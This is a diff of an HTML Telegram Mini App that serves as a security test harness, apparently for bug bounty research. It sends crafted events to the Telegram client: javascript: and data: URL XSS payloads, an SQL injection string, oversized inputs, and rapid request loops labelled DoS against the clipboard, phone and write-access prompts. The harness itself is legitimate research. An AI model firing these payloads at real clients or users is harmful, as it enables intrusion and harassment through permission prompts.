@@ -3,229 +3,570 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Telegram Security Research v2</title>
+  <title>TG Security Research v2</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
+    :root {
+      --bg: var(--tg-theme-bg-color, #0d1117);
+      --bg2: var(--tg-theme-secondary-bg-color, #161b22);
+      --text: var(--tg-theme-text-color, #e6edf3);
+      --hint: var(--tg-theme-hint-color, #8b949e);
+      --link: var(--tg-theme-link-color, #58a6ff);
+      --btn: var(--tg-theme-button-color, #238636);
+      --btn-text: var(--tg-theme-button-text-color, #ffffff);
+      --accent: #58a6ff;
+      --danger: #f85149;
+      --warn: #d29922;
+      --ok: #3fb950;
+      --purple: #bc8cff;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
-      font-family: sans-serif;
-      background: var(--tg-theme-bg-color, #fff);
-      color: var(--tg-theme-text-color, #000);
-      padding: 16px;
-      max-width: 500px;
-      margin: 0 auto;
-    }
-    h2 { font-size: 17px; margin-bottom: 4px; }
-    p  { font-size: 12px; color: #888; margin-bottom: 12px; }
-    .section {
-      background: var(--tg-theme-secondary-bg-color, #f5f5f5);
-      border-radius: 10px;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      background: var(--bg);
+      color: var(--text);
       padding: 12px;
-      margin-bottom: 12px;
+      font-size: 12px;
+      min-height: 100vh;
     }
-    .section h3 { font-size: 13px; margin: 0 0 8px 0; }
-    button {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      border-radius: 8px;
-      border: none;
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #30363d;
+    }
+
+    .header-title {
       font-size: 13px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.05em;
+    }
+
+    .platform-badge {
+      font-size: 10px;
+      padding: 2px 8px;
+      border-radius: 20px;
+      background: #21262d;
+      border: 1px solid #30363d;
+      color: var(--hint);
+    }
+
+    .platform-badge.web_k  { border-color: var(--accent); color: var(--accent); }
+    .platform-badge.web_a  { border-color: var(--ok); color: var(--ok); }
+    .platform-badge.android { border-color: var(--warn); color: var(--warn); }
+    .platform-badge.ios    { border-color: var(--purple); color: var(--purple); }
+
+    .section {
+      background: var(--bg2);
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 10px;
+      margin-bottom: 8px;
+    }
+
+    .section-title {
+      font-size: 10px;
+      font-weight: 700;
+      color: var(--hint);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+
+    .btn-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 6px;
+    }
+
+    button {
+      padding: 7px 10px;
+      border-radius: 4px;
+      border: 1px solid transparent;
+      font-family: inherit;
+      font-size: 10px;
       font-weight: 600;
       cursor: pointer;
-      margin-bottom: 6px;
       text-align: left;
+      line-height: 1.3;
+      transition: opacity 0.1s;
     }
-    .btn-blue   { background: #2481cc; color: #fff; }
-    .btn-orange { background: #f0a500; color: #fff; }
-    .btn-red    { background: #e53935; color: #fff; }
-    .btn-green  { background: #43a047; color: #fff; }
-    .btn-purple { background: #7b1fa2; color: #fff; }
+    button:active { opacity: 0.7; }
+
+    .btn-safe   { background: #0d2c17; border-color: #238636; color: var(--ok); }
+    .btn-warn   { background: #2d2107; border-color: #9e6a03; color: var(--warn); }
+    .btn-danger { background: #2c0f0f; border-color: #6e2020; color: var(--danger); }
+    .btn-info   { background: #0d1d32; border-color: #1f6feb; color: var(--accent); }
+    .btn-purple { background: #1e1230; border-color: #6e40c9; color: var(--purple); }
+    .btn-full   { grid-column: 1 / -1; }
+
+    .log-wrap {
+      background: #010409;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 8px;
+    }
+
+    .log-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 6px;
+    }
+
+    .log-title {
+      font-size: 10px;
+      color: var(--hint);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+    }
+
+    .log-actions { display: flex; gap: 6px; }
+
+    .log-btn {
+      font-size: 9px;
+      padding: 2px 6px;
+      border-radius: 3px;
+      border: 1px solid #30363d;
+      background: #161b22;
+      color: var(--hint);
+      cursor: pointer;
+      font-family: inherit;
+    }
+
     #log {
-      background: #111;
-      color: #0f0;
-      font-family: monospace;
-      font-size: 11px;
-      padding: 10px;
-      border-radius: 8px;
-      min-height: 100px;
-      max-height: 200px;
+      min-height: 140px;
+      max-height: 240px;
       overflow-y: auto;
-      white-space: pre-wrap;
-      word-break: break-all;
+      font-size: 10px;
+      line-height: 1.6;
     }
-    .clear-btn {
-      background: #333;
+
+    .log-line { display: flex; gap: 6px; }
+    .log-ts { color: #3d444d; flex-shrink: 0; }
+    .log-send { color: var(--accent); }
+    .log-recv { color: var(--ok); }
+    .log-warn { color: var(--warn); }
+    .log-err  { color: var(--danger); }
+    .log-info { color: var(--hint); }
+    .log-data { color: #d2a8ff; margin-left: 14px; word-break: break-all; }
+
+    .diff-badge {
+      display: inline-block;
+      font-size: 9px;
+      padding: 0 4px;
+      border-radius: 3px;
+      background: var(--danger);
       color: #fff;
-      margin-top: 6px;
+      margin-left: 4px;
+    }
+
+    .status-bar {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 8px;
+    }
+
+    .stat {
+      flex: 1;
+      background: var(--bg2);
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      padding: 6px 8px;
       text-align: center;
     }
+
+    .stat-val {
+      font-size: 16px;
+      font-weight: 700;
+      line-height: 1;
+    }
+
+    .stat-lbl {
+      font-size: 9px;
+      color: var(--hint);
+      margin-top: 2px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .stat.sent  .stat-val { color: var(--accent); }
+    .stat.recv  .stat-val { color: var(--ok); }
+    .stat.diffs .stat-val { color: var(--danger); }
   </style>
 </head>
 <body>
 
-<h2>🔬 Telegram Security Research v2</h2>
-<p>Testing various Mini App event types for Telegram Bug Bounty research.</p>
-
-<!-- TEST 1: web_app_share_to_story -->
-<div class="section">
-  <h3>🧪 Test 1: web_app_share_to_story</h3>
-  <button class="btn-blue" onclick="test_share_story_normal()">▶ Normal story share</button>
-  <button class="btn-orange" onclick="test_share_story_js()">⚠ javascript: URL in widget_link</button>
-  <button class="btn-red" onclick="test_share_story_data()">🔴 data: URL in media_url</button>
+<div class="header">
+  <span class="header-title">[ TG-SEC-RESEARCH v2 ]</span>
+  <span class="platform-badge" id="plat-badge">...</span>
 </div>
 
-<!-- TEST 2: web_app_open_link -->
-<div class="section">
-  <h3>🧪 Test 2: web_app_open_link (patched CVE-2024-33905)</h3>
-  <button class="btn-green" onclick="test_open_link_normal()">▶ Normal HTTPS link</button>
-  <button class="btn-orange" onclick="test_open_link_js()">⚠ javascript: protocol</button>
-  <button class="btn-red" onclick="test_open_link_data()">🔴 data: protocol</button>
-  <button class="btn-red" onclick="test_open_link_tg()">🔴 tg:// protocol</button>
+<!-- Stats -->
+<div class="status-bar">
+  <div class="stat sent"><div class="stat-val" id="cnt-sent">0</div><div class="stat-lbl">Sent</div></div>
+  <div class="stat recv"><div class="stat-val" id="cnt-recv">0</div><div class="stat-lbl">Received</div></div>
+  <div class="stat diffs"><div class="stat-val" id="cnt-diff">0</div><div class="stat-lbl">Findings</div></div>
 </div>
 
-<!-- TEST 3: web_app_setup_closing_behavior -->
+<!-- TEST 1 -->
 <div class="section">
-  <h3>🧪 Test 3: web_app_setup_closing_behavior</h3>
-  <button class="btn-blue" onclick="test_closing_normal()">▶ Normal (need_confirmation: true)</button>
-  <button class="btn-orange" onclick="test_closing_payload()">⚠ Inject in need_confirmation</button>
+  <div class="section-title">T1 · web_app_share_to_story</div>
+  <div class="btn-grid">
+    <button class="btn-safe" onclick="t1_normal()">▶ Normal share</button>
+    <button class="btn-warn" onclick="t1_js_widget()">⚠ javascript: in widget_link</button>
+    <button class="btn-danger" onclick="t1_data_media()">✗ data: in media_url</button>
+    <button class="btn-danger" onclick="t1_tg_deep()">✗ tg:// in widget_link</button>
+  </div>
 </div>
 
-<!-- TEST 4: web_app_invoke_custom_method -->
+<!-- TEST 2 -->
 <div class="section">
-  <h3>🧪 Test 4: web_app_invoke_custom_method</h3>
-  <button class="btn-purple" onclick="test_custom_method()">▶ getStorageValues</button>
-  <button class="btn-red" onclick="test_custom_method_inject()">🔴 SQL injection in method name</button>
-  <button class="btn-red" onclick="test_custom_method_overflow()">🔴 Large params payload</button>
+  <div class="section-title">T2 · web_app_open_link</div>
+  <div class="btn-grid">
+    <button class="btn-safe" onclick="t2_normal()">▶ HTTPS</button>
+    <button class="btn-warn" onclick="t2_iv()">⚠ instant_view + js:</button>
+    <button class="btn-danger" onclick="t2_js()">✗ javascript:</button>
+    <button class="btn-danger" onclick="t2_data()">✗ data:</button>
+    <button class="btn-danger btn-full" onclick="t2_tg()">✗ tg:// deep link injection</button>
+  </div>
 </div>
 
-<!-- TEST 5: web_app_set_background_color -->
+<!-- TEST 3 -->
 <div class="section">
-  <h3>🧪 Test 5: web_app_set_background_color</h3>
-  <button class="btn-green" onclick="test_bg_normal()">▶ Normal color (#ff0000)</button>
-  <button class="btn-orange" onclick="test_bg_xss()">⚠ XSS in color value</button>
-  <button class="btn-red" onclick="test_bg_overflow()">🔴 Very long color string</button>
+  <div class="section-title">T3 · web_app_setup_closing_behavior</div>
+  <div class="btn-grid">
+    <button class="btn-safe" onclick="t3_normal()">▶ need_confirmation: true</button>
+    <button class="btn-warn" onclick="t3_type_inject()">⚠ string instead of bool</button>
+    <button class="btn-danger" onclick="t3_loop()">✗ 100x loop (DoS)</button>
+    <button class="btn-danger" onclick="t3_null()">✗ null value</button>
+  </div>
+</div>
+
+<!-- TEST 4 -->
+<div class="section">
+  <div class="section-title">T4 · web_app_invoke_custom_method</div>
+  <div class="btn-grid">
+    <button class="btn-info" onclick="t4_normal()">▶ getStorageValues</button>
+    <button class="btn-warn" onclick="t4_unknown()">⚠ unknown method</button>
+    <button class="btn-danger" onclick="t4_sqli()">✗ SQL inject in method</button>
+    <button class="btn-danger" onclick="t4_overflow()">✗ 1000-key params</button>
+    <button class="btn-danger btn-full" onclick="t4_reqid_long()">✗ req_id = 10k chars</button>
+  </div>
+</div>
+
+<!-- TEST 5 -->
+<div class="section">
+  <div class="section-title">T5 · web_app_set_background_color</div>
+  <div class="btn-grid">
+    <button class="btn-safe" onclick="t5_normal()">▶ #ff0000</button>
+    <button class="btn-warn" onclick="t5_keyword()">⚠ CSS keyword</button>
+    <button class="btn-danger" onclick="t5_xss()">✗ XSS payload</button>
+    <button class="btn-danger" onclick="t5_null()">✗ null</button>
+    <button class="btn-danger" onclick="t5_overflow()">✗ 10k char string</button>
+    <button class="btn-warn" onclick="t5_array()">⚠ array type</button>
+  </div>
+</div>
+
+<!-- NEW: TEST 6 -->
+<div class="section">
+  <div class="section-title">T6 · web_app_read_text_from_clipboard [NEW]</div>
+  <div class="btn-grid">
+    <button class="btn-info" onclick="t6_normal()">▶ Normal request</button>
+    <button class="btn-danger" onclick="t6_loop()">✗ 50x rapid loop</button>
+  </div>
+</div>
+
+<!-- NEW: TEST 7 -->
+<div class="section">
+  <div class="section-title">T7 · web_app_request_phone / write_access [NEW]</div>
+  <div class="btn-grid">
+    <button class="btn-info" onclick="t7_phone()">▶ request_phone</button>
+    <button class="btn-info" onclick="t7_write()">▶ request_write_access</button>
+    <button class="btn-danger" onclick="t7_both_loop()">✗ both() rapid loop</button>
+  </div>
 </div>
 
 <!-- LOG -->
-<div class="section">
-  <h3>📋 Event Log</h3>
-  <div id="log">Waiting...\n</div>
-  <button class="clear-btn" onclick="clearLog()">🗑 Clear</button>
+<div class="log-wrap">
+  <div class="log-header">
+    <span class="log-title">Event Log</span>
+    <div class="log-actions">
+      <button class="log-btn" onclick="copyLog()">Copy</button>
+      <button class="log-btn" onclick="clearLog()">Clear</button>
+    </div>
+  </div>
+  <div id="log"></div>
 </div>
 
 <script>
 const tg = window.Telegram?.WebApp;
 const logEl = document.getElementById('log');
+let cntSent = 0, cntRecv = 0, cntDiff = 0;
 
-function log(msg) {
-  const ts = new Date().toLocaleTimeString();
-  logEl.textContent += `[${ts}] ${msg}\n`;
+const platformRaw = tg?.platform ?? 'unknown';
+const platBadge = document.getElementById('plat-badge');
+platBadge.textContent = platformRaw;
+platBadge.className = 'platform-badge ' + platformRaw.replace(/[^a-z_]/g,'');
+
+function updateStats() {
+  document.getElementById('cnt-sent').textContent = cntSent;
+  document.getElementById('cnt-recv').textContent = cntRecv;
+  document.getElementById('cnt-diff').textContent = cntDiff;
+}
+
+function ts() {
+  return new Date().toLocaleTimeString('en', { hour12: false });
+}
+
+function log(cls, msg, data) {
+  const line = document.createElement('div');
+  line.className = 'log-line';
+  line.innerHTML = `<span class="log-ts">${ts()}</span><span class="${cls}">${msg}</span>`;
+  logEl.appendChild(line);
+  if (data !== undefined) {
+    const d = document.createElement('div');
+    d.className = 'log-data';
+    d.textContent = typeof data === 'string' ? data : JSON.stringify(data);
+    logEl.appendChild(d);
+  }
   logEl.scrollTop = logEl.scrollHeight;
 }
 
-function clearLog() { logEl.textContent = 'Cleared.\n'; }
+function clearLog() { logEl.innerHTML = ''; }
+function copyLog() {
+  const txt = Array.from(logEl.querySelectorAll('.log-line, .log-data'))
+    .map(el => el.textContent).join('\n');
+  navigator.clipboard?.writeText(txt).then(() => log('log-info','Copied to clipboard'));
+}
 
-function send(eventType, eventData) {
-  log(`→ Sending: ${eventType}`);
-  log(`  data: ${JSON.stringify(eventData)}`);
-  window.parent.postMessage(JSON.stringify({ eventType, eventData }), '*');
+function send(eventType, eventData, tag) {
+  cntSent++;
+  updateStats();
+  log('log-send', `→ [${platformRaw}] ${eventType}${tag ? ' [' + tag + ']' : ''}`, eventData);
+
+  const payload = JSON.stringify({ eventType, eventData });
+  window.parent.postMessage(payload, 'https://web.telegram.org');
+
   if (window.TelegramWebviewProxy) {
-    window.TelegramWebviewProxy.postEvent(eventType, JSON.stringify(eventData));
-    log(`  (also sent via TelegramWebviewProxy)`);
+    try {
+      window.TelegramWebviewProxy.postEvent(eventType, JSON.stringify(eventData));
+      log('log-info', '  also via TelegramWebviewProxy');
+    } catch(e) {
+      log('log-err', '  TelegramWebviewProxy error: ' + e.message);
+    }
   }
+}
+
+function markFinding(reason) {
+  cntDiff++;
+  updateStats();
+  log('log-err', '⚡ FINDING: ' + reason);
 }
 
 window.addEventListener('message', (e) => {
   try {
     const d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
-    if (d?.eventType) log(`← Received: ${d.eventType} → ${JSON.stringify(d.eventData ?? {})}`);
+    if (d?.eventType) {
+      cntRecv++;
+      updateStats();
+      log('log-recv', `← ${d.eventType}`, d.eventData ?? {});
+
+      // Auto-detect findings
+      if (d.eventType === 'web_app_open_link' && d.eventData?.url?.startsWith('javascript:')) {
+        markFinding('javascript: scheme not blocked in web_app_open_link');
+      }
+      if (d.eventType === 'web_app_set_background_color' && typeof d.eventData?.color !== 'string') {
+        markFinding('non-string color accepted without validation');
+      }
+    }
   } catch {}
 });
 
-// TEST 1
-function test_share_story_normal() {
+if (tg) {
+  tg.onEvent('custom_method_invoked', (result) => {
+    cntRecv++;
+    updateStats();
+    log('log-recv', '← custom_method_invoked', result);
+  });
+  tg.onEvent('clipboard_text_received', (result) => {
+    cntRecv++;
+    updateStats();
+    log('log-recv', '← clipboard_text_received', result);
+  });
+  tg.onEvent('phone_requested', (result) => {
+    cntRecv++;
+    updateStats();
+    log('log-recv', '← phone_requested', result);
+  });
+  tg.onEvent('write_access_requested', (result) => {
+    cntRecv++;
+    updateStats();
+    log('log-recv', '← write_access_requested', result);
+  });
+}
+
+// ─── T1 ───────────────────────────────────────────────
+function t1_normal() {
   send('web_app_share_to_story', {
     media_url: 'https://germzu.github.io/tg-test/test.png',
     widget_link: { url: 'https://t.me/Germzutest_bot', name: 'Test' }
-  });
+  }, 'normal');
 }
-function test_share_story_js() {
+function t1_js_widget() {
   send('web_app_share_to_story', {
     media_url: 'https://germzu.github.io/tg-test/test.png',
-    widget_link: { url: 'javascript:alert(document.cookie)', name: 'Test' }
-  });
+    widget_link: { url: 'javascript:alert(document.cookie)', name: 'XSS' }
+  }, 'js:url');
 }
-function test_share_story_data() {
+function t1_data_media() {
   send('web_app_share_to_story', {
-    media_url: 'data:text/html,<script>alert(1)<\/script>',
+    media_url: 'data:text/html,<script>alert(origin)<\/script>',
     widget_link: { url: 'https://t.me/Germzutest_bot', name: 'Test' }
-  });
+  }, 'data:url');
+}
+function t1_tg_deep() {
+  send('web_app_share_to_story', {
+    media_url: 'https://germzu.github.io/tg-test/test.png',
+    widget_link: { url: 'tg://user?id=12345678', name: 'Deep' }
+  }, 'tg://url');
 }
 
-// TEST 2
-function test_open_link_normal() {
-  send('web_app_open_link', { url: 'https://telegram.org' });
+// ─── T2 ───────────────────────────────────────────────
+function t2_normal() {
+  send('web_app_open_link', { url: 'https://telegram.org' }, 'normal');
 }
-function test_open_link_js() {
-  send('web_app_open_link', { url: 'javascript:alert(document.cookie)' });
+function t2_js() {
+  send('web_app_open_link', { url: 'javascript:alert(document.cookie)' }, 'js:');
 }
-function test_open_link_data() {
-  send('web_app_open_link', { url: 'data:text/html,<h1>XSS</h1>' });
+function t2_data() {
+  send('web_app_open_link', { url: 'data:text/html,<h1>XSS</h1><script>alert(1)<\/script>' }, 'data:');
 }
-function test_open_link_tg() {
-  send('web_app_open_link', { url: 'tg://resolve?domain=GermzuTestBot' });
+function t2_tg() {
+  send('web_app_open_link', { url: 'tg://resolve?domain=telegram' }, 'tg://');
 }
-
-// TEST 3
-function test_closing_normal() {
-  send('web_app_setup_closing_behavior', { need_confirmation: true });
-}
-function test_closing_payload() {
-  send('web_app_setup_closing_behavior', { need_confirmation: 'true; alert(1)' });
+function t2_iv() {
+  send('web_app_open_link', {
+    url: 'javascript:alert(1)',
+    try_instant_view: true
+  }, 'iv+js:');
 }
 
-// TEST 4
-function test_custom_method() {
+// ─── T3 ───────────────────────────────────────────────
+function t3_normal() {
+  send('web_app_setup_closing_behavior', { need_confirmation: true }, 'normal');
+}
+function t3_type_inject() {
+  send('web_app_setup_closing_behavior', { need_confirmation: 'true; alert(1)' }, 'string');
+}
+function t3_loop() {
+  log('log-warn', 'T3 loop: sending 100x...');
+  for (let i = 0; i < 100; i++) {
+    send('web_app_setup_closing_behavior', { need_confirmation: i % 2 === 0 }, `loop#${i}`);
+  }
+}
+function t3_null() {
+  send('web_app_setup_closing_behavior', { need_confirmation: null }, 'null');
+}
+
+// ─── T4 ───────────────────────────────────────────────
+function t4_normal() {
   send('web_app_invoke_custom_method', {
-    req_id: 'test_001',
+    req_id: 'req_001',
     method: 'getStorageValues',
     params: { keys: ['balance', 'user_id'] }
-  });
+  }, 'normal');
 }
-function test_custom_method_inject() {
+function t4_unknown() {
   send('web_app_invoke_custom_method', {
-    req_id: 'test_002',
+    req_id: 'req_002',
+    method: 'thisMethodDoesNotExist',
+    params: {}
+  }, 'unknown');
+}
+function t4_sqli() {
+  send('web_app_invoke_custom_method', {
+    req_id: 'req_003',
     method: "getStorage'; DROP TABLE users; --",
     params: {}
-  });
+  }, 'sqli');
 }
-function test_custom_method_overflow() {
+function t4_overflow() {
   send('web_app_invoke_custom_method', {
-    req_id: 'test_003',
+    req_id: 'req_004',
     method: 'getStorageValues',
     params: { keys: Array(1000).fill('key_' + 'A'.repeat(100)) }
-  });
+  }, 'overflow');
+}
+function t4_reqid_long() {
+  send('web_app_invoke_custom_method', {
+    req_id: 'R'.repeat(10000),
+    method: 'getStorageValues',
+    params: { keys: ['test'] }
+  }, 'reqid_overflow');
 }
 
-// TEST 5
-function test_bg_normal() {
-  send('web_app_set_background_color', { color: '#ff0000' });
+// ─── T5 ───────────────────────────────────────────────
+function t5_normal() {
+  send('web_app_set_background_color', { color: '#ff0000' }, 'normal');
 }
-function test_bg_xss() {
-  send('web_app_set_background_color', { color: '"><script>alert(1)<\/script>' });
+function t5_keyword() {
+  send('web_app_set_background_color', { color: 'rebeccapurple' }, 'css-keyword');
 }
-function test_bg_overflow() {
-  send('web_app_set_background_color', { color: '#' + 'A'.repeat(10000) });
+function t5_xss() {
+  send('web_app_set_background_color', { color: '"><img src=x onerror=alert(1)>' }, 'xss');
+}
+function t5_null() {
+  send('web_app_set_background_color', { color: null }, 'null');
+}
+function t5_overflow() {
+  send('web_app_set_background_color', { color: '#' + 'F'.repeat(10000) }, 'overflow');
+}
+function t5_array() {
+  send('web_app_set_background_color', { color: ['#ff0000', '#00ff00'] }, 'array');
 }
 
-// Init
+// ─── T6 ───────────────────────────────────────────────
+function t6_normal() {
+  send('web_app_read_text_from_clipboard', { req_id: 'clip_001' }, 'normal');
+}
+function t6_loop() {
+  log('log-warn', 'T6 loop: sending 50x clipboard requests...');
+  for (let i = 0; i < 50; i++) {
+    send('web_app_read_text_from_clipboard', { req_id: `clip_${i}` }, `loop#${i}`);
+  }
+}
+
+// ─── T7 ───────────────────────────────────────────────
+function t7_phone() {
+  send('web_app_request_phone', {}, 'normal');
+}
+function t7_write() {
+  send('web_app_request_write_access', {}, 'normal');
+}
+function t7_both_loop() {
+  log('log-warn', 'T7 loop: phone + write 20x each...');
+  for (let i = 0; i < 20; i++) {
+    send('web_app_request_phone', {}, `loop#${i}`);
+    send('web_app_request_write_access', {}, `loop#${i}`);
+  }
+}
+
+// ─── Init ──────────────────────────────────────────────
 if (tg) {
   tg.ready();
   tg.expand();
-  log(`✅ WebApp ready. Version: ${tg.version}`);
-  log(`📱 Platform: ${tg.platform}`);
+  log('log-info', `WebApp ready · v${tg.version} · ${platformRaw}`);
+  log('log-info', `initDataUnsafe keys: ${Object.keys(tg.initDataUnsafe ?? {}).join(', ')}`);
 } else {
-  log('⚠ Not inside Telegram!');
+  log('log-warn', 'Not inside Telegram — postMessage only');
 }
 </script>
 </body>
